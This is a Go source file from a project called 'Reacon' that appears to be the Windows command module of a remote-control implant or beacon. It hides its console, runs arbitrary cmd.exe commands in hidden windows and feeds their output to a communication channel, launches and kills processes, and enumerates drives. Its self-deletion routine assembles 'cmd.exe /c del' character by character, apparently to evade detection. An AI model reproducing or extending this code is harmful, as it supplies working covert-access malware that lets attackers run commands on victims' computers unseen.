package commands

import (
	"Reacon/pkg/communication"
	"errors"
	"golang.org/x/sys/windows"
	"os"
	"strconv"
	"syscall"
	"time"
	"unsafe"
)

var (
	kernel32          = windows.NewLazySystemDLL("kernel32.dll")
	user32            = windows.NewLazyDLL("user32.dll")
	getConsoleWindow  = kernel32.NewProc("GetConsoleWindow")
	showWindow        = user32.NewProc("ShowWindow")
	SetThreadPriority = kernel32.NewProc("SetThreadPriority")
)

func HideConsole() error {
	if getConsoleWindow.Find() == nil && showWindow.Find() == nil {
		hwnd, _, _ := getConsoleWindow.Call()
		if hwnd != 0 {
			_, _, err := showWindow.Call(hwnd, windows.SW_HIDE)
			if err != nil {
				return err
			}
		}
	}
	return nil
}

// windows 下设置不需要DPI缩放
func SetProcessDPIAware() error {
	_, _, err := user32.NewProc("SetProcessDPIAware").Call(0)
	if err != nil {
		return err
	}
	return nil
}
func Shell(path string, args []byte) ([]byte, error) {
	return Run(append([]byte(path), args...))
}

// windows 下的命令执行函数
func Run(b []byte) ([]byte, error) {
	var (
		sI     windows.StartupInfo
		pI     windows.ProcessInformation
		status = windows.CREATE_NO_WINDOW

		hWPipe windows.Handle
		hRPipe windows.Handle
	)

	sa := windows.SecurityAttributes{
		Length:             uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
		SecurityDescriptor: nil,
		InheritHandle:      1, //true
	}

	err := windows.CreatePipe(&hRPipe, &hWPipe, &sa, 0)
	if err != nil {
		return nil, err
	}

	sI.Flags = windows.STARTF_USESTDHANDLES
	sI.StdErr = hWPipe
	sI.StdOutput = hWPipe
	sI.ShowWindow = windows.SW_HIDE

	command := "C:\\windows\\system32\\cmd.exe /C " + string(b)

	program, _ := windows.UTF16PtrFromString(command)

	err = windows.CreateProcess(
		nil,
		program,
		nil,
		nil,
		true,
		uint32(status),
		nil,
		nil,
		&sI,
		&pI)
	if err != nil {
		return nil, errors.New("could not spawn " + string(b) + " " + err.Error())
	}

	_, err = windows.WaitForSingleObject(pI.Process, 10*1000)
	if err != nil {
		return nil, errors.New("[-] WaitForSingleObject(Process) error : " + err.Error())
	}

	var read windows.Overlapped
	var buf []byte
	firstTime := true
	lastTime := false

	for !lastTime {
		event, _ := windows.WaitForSingleObject(pI.Process, 0)
		if event == windows.WAIT_OBJECT_0 || event == windows.WAIT_FAILED {
			lastTime = true
		}
		buf = make([]byte, 1024*50)
		_ = windows.ReadFile(hRPipe, buf, nil, &read)
		if read.InternalHigh > 0 {
			if firstTime {
				communication.DataProcess(0, buf[:read.InternalHigh])
				firstTime = false
			} else {
				communication.DataProcess(0, append([]byte("[+] "+string(b)+" :\n"), buf[:read.InternalHigh]...))
				if lastTime {
					communication.DataProcess(0, []byte("-----------------------------------end-----------------------------------"))
				}
			}
		}
		time.Sleep(5000 * time.Millisecond)
	}

	err = windows.CloseHandle(pI.Process)
	if err != nil {
		return nil, err
	}
	err = windows.CloseHandle(pI.Thread)
	if err != nil {
		return nil, err
	}
	err = windows.CloseHandle(hWPipe)
	if err != nil {
		return nil, err
	}
	err = windows.CloseHandle(hRPipe)
	if err != nil {
		return nil, err
	}

	//return buf[:read.InternalHigh], nil
	return []byte("success"), nil
}
func DeleteSelf() ([]byte, error) {
	var sI windows.StartupInfo
	var pI windows.ProcessInformation
	sI.ShowWindow = windows.SW_HIDE

	filename, err := os.Executable()
	if err != nil {
		return nil, err
	}
	program, _ := syscall.UTF16PtrFromString("c" + "m" + "d" + "." + "e" + "x" + "e" + " /c" + " d" + "e" + "l " + filename)
	err = windows.CreateProcess(
		nil,
		program,
		nil,
		nil,
		true,
		windows.CREATE_NO_WINDOW,
		nil,
		nil,
		&sI,
		&pI)
	if err != nil {
		return nil, errors.New("could not delete " + filename + " " + err.Error())
	}
	err = windows.SetPriorityClass(pI.Process, windows.IDLE_PRIORITY_CLASS)
	if err != nil {
		return nil, err
	}
	process, err := windows.GetCurrentProcess()
	if err != nil {
		return nil, err
	}
	thread, err := windows.GetCurrentThread()
	if err != nil {
		return nil, err
	}
	err = windows.SetPriorityClass(process, windows.REALTIME_PRIORITY_CLASS)
	if err != nil {
		return nil, err
	}
	THREAD_PRIORITY_TIME_CRITICAL := 15
	_, _, err = SetThreadPriority.Call(uintptr(thread), uintptr(THREAD_PRIORITY_TIME_CRITICAL))
	if err != nil && err.Error() != "The operation completed successfully." {
		return nil, err
	}
	return []byte("success delete"), nil

}
func Execute(b []byte) ([]byte, error) {
	var sI windows.StartupInfo
	var pI windows.ProcessInformation
	var status = windows.CREATE_NO_WINDOW
	sI.ShowWindow = windows.SW_HIDE

	command := string(b)

	program, _ := syscall.UTF16PtrFromString(command)

	var err error

	err = windows.CreateProcess(
		nil,
		program,
		nil,
		nil,
		true,
		uint32(status),
		nil,
		nil,
		&sI,
		&pI)
	if err != nil {
		return nil, errors.New("could not spawn " + string(b) + " " + err.Error())
	}

	return []byte("success execute " + string(b)), nil
}
func KillProcess(pid uint32) ([]byte, error) {
	proc, err := windows.OpenProcess(windows.PROCESS_TERMINATE, false, pid)
	if err != nil {
		return nil, err
	}
	err = windows.TerminateProcess(proc, 0)
	if err != nil {
		return nil, err
	}
	return []byte("kill " + strconv.Itoa(int(pid)) + " success"), nil
}
func Drives() ([]byte, error) {
	drivers := ""
	// 定义所有可能的盘符
	driveLetters := "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
	for _, letter := range driveLetters {
		path := string(letter) + ":\\"
		// 检查是否是有效路径
		if _, err := os.Stat(path); err == nil {
			drivers += string(letter)
		}
	}

	//bitMask, err := windows.GetLogicalDrives()
	//if err != nil {
	//	return nil, err
	//}
	result := []byte(drivers)
	return result, nil
}
